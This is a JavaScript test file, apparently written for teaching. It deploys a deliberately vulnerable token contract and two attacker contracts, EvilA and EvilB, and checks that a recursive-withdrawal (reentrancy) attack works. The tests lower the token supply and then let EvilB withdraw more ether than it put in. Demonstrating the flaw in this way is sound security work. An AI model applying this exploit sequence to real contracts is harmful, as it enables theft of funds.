const VulnerableCoin = artifacts.require("VulnerableCoin");
const EvilA = artifacts.require("EvilA");
const EvilB = artifacts.require("EvilB");

describe("Evil", function() {
  let a1, a2, vulnerableCoin, evilA, evilB;
  // we need at least nrOfRecursiveWithdrawals * 2 * evilAmount; 3 * 2 * 2 < 11 + 2
  let normalBuyAmount = new web3.BigNumber(web3.toWei(11));
  let evilBuyAmount = new web3.BigNumber(web3.toWei(2));

  before(function (done) {
    a1 = null;
    a2 = null;
    vulnerableCoin = null;
    evilA = null;
    evilB = null;

    web3.eth.getAccounts(function(err, res) {
      let futureVulnerable, futureEvilA, futureEvilB;
      [ a1, a2 ] = res;

      futureVulnerable = VulnerableCoin.new({from: a1});

      futureEvilB = futureVulnerable.then( (contract) => {
        vulnerableCoin = contract;
        return EvilB.new(vulnerableCoin.address, {from: a1});
      });

      futureEvilA = futureEvilB.then( (contract) => {
        evilB = contract;
        return EvilA.new(vulnerableCoin.address, evilB.address, {from: a1});
      });

      futureEvilA.then( (contract) => {
        evilA = contract;
        done();
      });
    });
  });

  it("should make evilB target vulnerable and evilA target both vulnerable an evilB", function(done) {
    const futureEvilBTargetVulnerable = evilB.vulnerableContract.call();
    const futureEvilATargetVulnerable = evilA.vulnerableContract.call();
    const futureEvilATargetB = evilA.evilB.call();

    Promise.all([
      futureEvilBTargetVulnerable,
      futureEvilATargetVulnerable,
      futureEvilATargetB
    ]).then(([bVulnerable, aVulnerable, aB]) => {
      assert.equal(vulnerableCoin.address, bVulnerable);
      assert.equal(vulnerableCoin.address, aVulnerable);
      assert.equal(evilB.address, aB);
      done();
    });
  });

  it("should buy VulnerableCoin as regular account", function(done) {
    const futureBuy = vulnerableCoin.buy.sendTransaction({
      from: a2,
      to: vulnerableCoin.address,
      value: normalBuyAmount
    });
    futureBuy.then( () => {
      const vcBalance = web3.eth.getBalance(vulnerableCoin.address);
      assert.equal(vcBalance.valueOf(), normalBuyAmount.valueOf(), "Did not store what we sent");
      done();
    });
  });

  it("Should buy VulnerableCoin as smart contract", function(done) {
    const futureBuy = evilA.enter.sendTransaction(evilBuyAmount, {
      from: a1,
      to: evilA.address,
      value: evilBuyAmount
    });

    futureBuy.then( () => {
      const vcBalance = web3.eth.getBalance(vulnerableCoin.address);
      const eABalance = web3.eth.getBalance(evilA.address);
      const expectedTotal = normalBuyAmount.add(evilBuyAmount);
      futureBuy.then( () => {
        assert.equal(eABalance.valueOf(), 0, "Eth did not left EvilA contract");
        assert.equal(vcBalance.valueOf(), expectedTotal.valueOf(), "Eth not add up to VulnerableCoin/ did not get in EvilA in the first place");
        done();
      });
    });
  });

  it("Should have balance = totalSupply in VulnerableCoin", function (done) {
    const vcBalance = web3.eth.getBalance(vulnerableCoin.address);
    const futureVcSupply = vulnerableCoin.totalSupply();

    futureVcSupply.then( (vcSupply) => {
      assert.equal(vcSupply.valueOf(), vcBalance.valueOf(), "VulnerablaCoin does not have totalSupply equal to balance");
      done();
    })
  });

  it("Should decrease VulnerableCoin totalSupply without affecting balance and transfer tokens to evilB", function(done) {
    // EvilA contract withdraws 3 times, but returns all the ether to VulnerableContract
    // We expect the same balance
    const expectedEvilABalance = web3.eth.getBalance(evilA.address);
    // VulnerableCoin has its balance unaffected
    const expectedVcBalance = normalBuyAmount.add(evilBuyAmount);
    const futureEvilAExit = evilA.exit.sendTransaction(evilBuyAmount, {
      from: a1,
      to: evilA.address,
      value: 0,
      gas: 3000000
    });

    futureEvilAExit.then( () => {
      const vcBalance = web3.eth.getBalance(vulnerableCoin.address);
      const eABalance = web3.eth.getBalance(evilA.address);
      const futureEATokenBalance = vulnerableCoin.balanceOf(evilA.address);
      const futureEBTokenBalance = vulnerableCoin.balanceOf(evilB.address);
      const futureVcSupply = vulnerableCoin.totalSupply();

      Promise.all([
        futureEATokenBalance,
        futureEBTokenBalance,
        futureVcSupply
      ]).then( ([eATokenBalance, eBTokenBalance, vcSupply]) => {
        assert.isTrue(eABalance.lessThanOrEqualTo(expectedEvilABalance), "EvilA ended up with more ether / did not return it");
        assert.equal(vcBalance.valueOf(), expectedVcBalance.valueOf(), "Eth did not return to VulnerableContract");
        assert.equal(eATokenBalance.valueOf(), '0', "EvilA did not send token balance");
        assert.equal(eBTokenBalance.valueOf(), evilBuyAmount.valueOf(), "EvilB did not receive tokens");
        assert.isTrue(vcSupply.lessThan(vcBalance), "VulnerableCoin total supply was not decreased");
        done();
      });
    });
  });

  // evilB attack
  it("should withdraw half the ether from VulnerableCoin to evilB", function(done) {
    // the times EvilA recursed withdraw
    const futureEvilBExit = evilB.exit(2);

    futureEvilBExit.then( () => {
      const expectedEbBalance = evilBuyAmount.mul(3);
      const ebBalance = web3.eth.getBalance(evilB.address);

      assert.equal(ebBalance.valueOf(), expectedEbBalance.valueOf(), "EvilB did not over withdrew");
      done();
    });
  });

});